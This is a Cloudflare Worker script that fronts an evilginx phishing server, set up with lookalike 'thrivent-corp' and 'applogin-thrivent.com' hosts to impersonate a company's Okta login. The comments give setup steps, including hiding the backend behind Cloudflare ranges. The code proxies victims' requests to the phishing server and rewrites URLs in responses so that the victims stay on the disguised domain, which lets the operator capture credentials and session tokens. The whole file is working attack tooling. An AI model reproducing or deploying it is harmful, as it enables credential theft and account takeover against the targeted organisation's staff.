// Replace all <your.workers.dev> with your workers dev link
// Replace all <evilginx.domain.tld> with your domain configured for evilginx (allowlist the Cloudflare ranges and block all else on the machine)
// Replace all <okta-specific-evilginx-subdomain> with the subdomain with the one created for your target within evilginx

const WORKER_HOST = "apps.thrivent-corp.workers.dev";

// vhost mappings.
const SPECIAL_VHOSTS = {
    "okta": "okta.applogin-thrivent.com",
    "cdn": "cdn.applogin-thrivent.com",
    "login": "login.applogin-thrivent.com"
};

// Reverse mapping for rewriting response URLs.
const REVERSE_SPECIAL_MAPPING = {
    "okta.applogin-thrivent.com": "okta",
    "cdn.applogin-thrivent.com": "cdn",
    "login.applogin-thrivent.com": "login"
};

addEventListener("fetch", event => {
    event.respondWith(handleRequest(event.request));
});

async function handleRequest(request) {
    const { url, pathnameSegments, effectivePrefix, newPath } = parseRequest(request);

    const targetUrl = constructTargetUrl(url, effectivePrefix, newPath);
    const modifiedRequest = new Request(targetUrl.toString(), request);

    let response = await fetch(modifiedRequest);
    response = await rewriteResponse(response, effectivePrefix);

    return response;
}

function parseRequest(request) {
    const url = new URL(request.url);
    const pathnameSegments = url.pathname.split("/").filter(Boolean);
    const vhostPrefix = pathnameSegments.length ? pathnameSegments[0] : "";
    const effectivePrefix = SPECIAL_VHOSTS[vhostPrefix] ? vhostPrefix : "okta";
    const newPath = pathnameSegments.length > 1 ? "/" + pathnameSegments.slice(1).join("/") : "/";

    return { url, pathnameSegments, effectivePrefix, newPath };
}

function constructTargetUrl(url, effectivePrefix, newPath) {
    const targetHost = SPECIAL_VHOSTS[effectivePrefix];
    const targetUrl = new URL(url);
    targetUrl.protocol = "https:";
    targetUrl.host = targetHost;
    targetUrl.pathname = newPath;

    // Handle redirect_url parameter
    if (targetUrl.searchParams.has("redirect_url")) {
        const redirectUrl = new URL(targetUrl.searchParams.get("redirect_url"));
        if (redirectUrl.host === WORKER_HOST) {
            redirectUrl.host = targetHost;
            targetUrl.searchParams.set("redirect_url", redirectUrl.toString());
        }
    }

    return targetUrl;
}

async function rewriteResponse(response, effectivePrefix) {
    const newHeaders = new Headers(response.headers);

    for (const [key, value] of newHeaders.entries()) {
        if (typeof value === "string" && value.includes("https://")) {
            newHeaders.set(key, rewriteText(value, effectivePrefix));
        }
    }

    const contentType = newHeaders.get("Content-Type") || "";
    if (isTextBasedContent(contentType)) {
        const originalText = await response.text();
        const rewrittenText = rewriteText(originalText, effectivePrefix);
        newHeaders.delete("Content-Length");
        return new Response(rewrittenText, {
            status: response.status,
            statusText: response.statusText,
            headers: newHeaders,
        });
    } else {
        return new Response(response.body, {
            status: response.status,
            statusText: response.statusText,
            headers: newHeaders,
        });
    }
}

function isTextBasedContent(contentType) {
    return contentType.includes("text") || contentType.includes("application/json") || contentType.includes("javascript");
}

/**
 * Rewrites any URLs found in the given text.
 *
 * It targets URLs that point to:
 *   - Known special domains (e.g. <okta-specific-evilginx-subdomain>.<evilginx.domain.tld>, cdn.<evilginx.domain.tld>, login.<evilginx.domain.tld>)
 *   - Or any URL ending in ".<evilginx.domain.tld>"
 *
 * The rewritten URL uses the WORKER_HOST and the effectivePrefix (which will be "<okta-specific-evilginx-subdomain>" if the original prefix was unknown).
 */
function rewriteText(text, effectivePrefix) {
    return text.replace(
        /https:\/\/([a-zA-Z0-9\.-]+)(\/[^\s"'<>]*)?/g,
        (match, host, path = "") => {
            let subdomain = getSubdomain(host, effectivePrefix);
            return subdomain ? `https://${WORKER_HOST}/${subdomain}${path}` : match;
        }
    );
}

function getSubdomain(host, effectivePrefix) {
    if (REVERSE_SPECIAL_MAPPING[host]) {
        return REVERSE_SPECIAL_MAPPING[host];
    } else if (host.endsWith(".applogin-thrivent.com")) {
        return host.slice(0, -".applogin-thrivent.com".length);
    } else {
        return effectivePrefix;
    }
}
